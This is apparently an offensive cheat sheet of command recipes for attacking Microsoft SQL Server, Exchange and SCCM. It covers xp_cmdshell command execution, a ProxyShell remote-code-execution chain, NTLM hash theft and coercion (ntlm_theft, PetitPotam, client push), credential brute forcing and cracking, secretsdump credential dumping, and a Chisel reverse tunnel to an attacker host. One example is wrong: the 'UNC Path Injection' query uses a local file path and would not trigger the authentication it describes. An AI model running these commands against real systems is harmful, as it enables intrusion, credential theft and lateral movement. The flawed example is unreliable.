## MSSQL Attacks

### Connect to MSSQL

```bash
impacket-mssqlclient <username>@<target-ip>
mssqlclient.py <DOMAIN>/<username>@<target-ip> -windows-auth
```

### Enumerate Server Logins and Roles

```sql
SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin
FROM master.sys.server_principals r
LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid
WHERE r.type IN ('S','E','X','U','G');
```

### Enumerate Databases and Trust Status

```sql
SELECT a.name AS 'database', b.name AS 'owner', is_trustworthy_on
FROM sys.databases a
JOIN sys.server_principals b ON a.owner_sid = b.sid;
```

### Check Login Impersonation Privileges

```sql
SELECT name FROM sys.server_permissions
JOIN sys.server_principals
ON grantor_principal_id = principal_id
WHERE permission_name = 'IMPERSONATE';
```

### UNC Path Injection (Capture Hash)

Forces the SQL server to authenticate to your attacker listener via SMB, capturing an NTLMv2 hash.

```sql
EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
```

### Enable and Use xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'ipconfig';
```

### Enable OLE Automation

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'ole automation procedures', 1;
RECONFIGURE;
```

### Enumerate Linked Servers

```sql
EXEC sp_linkedservers;
```

### Execute Queries on Linked Server

```sql
SELECT * FROM OPENQUERY(<linked-server-name>, 'SELECT name, database_id, create_date FROM sys.databases');
SELECT * FROM OPENQUERY(<linked-server-name>, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

### MSSQL from Windows (PowerUpSQL)

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "<target-ip>,1433" -username "<domain>\<username>" -password "<password>" -query 'Select @@version'
```

### Interactive SQL via mssqlclient.py

```bash
SQL> help
SQL> enable_xp_cmdshell
xp_cmdshell whoami /priv
```

---

## Exchange Attacks

### Version Enumeration

```bash
curl https://<target-ip>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version
```

### NTLM Hash Theft via HTML File

Send a crafted HTML to an internal user to capture their NTLMv2 hash.

```bash
python3 ntlm_theft.py -g htm -s <attacker-ip> -f <username>
```

### ProxyShell Exploit

Unauthenticated RCE chain (CVE-2021-34473 / CVE-2021-34523 / CVE-2021-31207).

```bash
python3 proxyshell.py -u <exchange-url> -e <target-email>
```

### Username Generation for Spray

```bash
./username-anarchy --input-file ./names.txt
```

### Ruler - Brute Force Exchange Credentials

```bash
./ruler-linux64 --domain <domain> --insecure brute --users users.txt --passwords password.txt --verbose
```

---

## SCCM Attacks

### PXE Boot Attack (PXEThief)

If PXE boot is enabled without password protection, recover configuration and credentials from boot images.

```bash
python .\pxethief.py 2 <target-ip>
tftp -i <target-ip> GET "\SMSTemp\<timestamp>.{<guid>}.boot.var" "<timestamp>.{<guid>}.boot.var"
python .\pxethief.py 5 '.\<timestamp>.{<guid>}.boot.var'
hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt
python .\pxethief.py 3 '.\<timestamp>.{<guid>}.boot.var' "<password>"
```

### Chisel Tunneling for Internal Access

```bash
./chisel server --reverse
.\chisel.exe client <attacker-ip>:8080 R:socks
```

### SCCMHunter - Discovery and Enumeration

```bash
proxychains4 -q python3 sccmhunter.py find -u <username> -p <password> -d <domain> -dc-ip <dc-ip>
python3 sccmhunter.py show -all
proxychains4 -q python3 sccmhunter.py smb -u <username> -p <password> -d <domain> -dc-ip <dc-ip> -save
proxychains4 -q python3 sccmhunter.py admin -u <username> -p <password> -ip <sccm-ip>
proxychains4 -q python3 sccmhunter.py admin -u <username> -p '<password>' -ip <sccm-ip> -au '<computer-name>' -ap <computer-password>
```

### DPAPI via SCCMHunter

```bash
proxychains4 -q python3 sccmhunter.py dpapi -u <username> -p <password> -d <domain> -dc-ip <dc-ip> -target <target-ip> -wmi
```

### PetitPotam via proxychains (Coerce SCCM Server)

```bash
proxychains4 -f <proxy-conf> python3 PetitPotam.py -u <username> -p '<password>' -d '<domain>' <proxy-ip> <target-ip>
```

### Connect to SCCM MSSQL via proxychains

```bash
proxychains4 -q -f <proxy-conf> mssqlclient.py '<username>'@<target-ip> -windows-auth -no-pass
```

### Get Domain User SID

```powershell
Get-DomainUser <username> -Properties objectsid
```

### Dump Secrets via proxychains

```bash
proxychains4 -q -f <proxy-conf> secretsdump.py '<username>'@<target-ip> -no-pass
```

### SCCMHunter with NTLM Hash Auth

```bash
proxychains4 -q -f <proxy-conf> python3 sccmhunter.py admin -u '<username>' -p <ntlm-hash> -ip <target-ip>
```

### Add Computer for SCCM Client Push Attack

```bash
proxychains4 -q addcomputer.py -computer-name '<computer-name>' -computer-pass '<computer-password>' -dc-ip <dc-ip> '<domain>/<username>':'<password>'
```

### Invoke Client Push (SharpSCCM)

Forces SCCM to push the client installer to a target, causing it to authenticate to you.

```powershell
.\SharpSCCM.exe invoke client-push -t <target-ip>
```

### SharpSCCM Device Enumeration

```powershell
.\SharpSCCM.exe get devices -n <sccm-server> -sms <target-ip>
.\SharpSCCM.exe get devices -w "<filter-condition>" -sms <target-ip>
.\SharpSCCM.exe get class-instances <class-name> -p <prop1> -p <prop2> -p <prop3> -p <prop4> -sms <target-ip>
.\SharpSCCM.exe get primary-users -u <username> -sms <target-ip>
```

### SharpSCCM - Deploy Application for Code Execution

```powershell
.\SharpSCCM.exe new application -s -n <app-name> -p <path-to-executable> -sms <target-ip>
.\SharpSCCM.exe new collection -n "<collection-name>" -t device -sms <target-ip>
.\SharpSCCM.exe new collection-member -d <device-name> -n "<collection-name>" -t device -sms <target-ip>
.\SharpSCCM.exe new deployment -a <app-name> -c "<collection-name>" -sms <target-ip>
.\SharpSCCM.exe invoke update -n "<collection-name>" -sms <target-ip>
```

### Inveigh for Hash Capture During Client Push

```powershell
.\Inveigh.exe
```

### xfreerdp to SCCM Targets

```bash
xfreerdp /u:<username> /p:'<password>' /d:<domain> /v:<target-ip> /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```
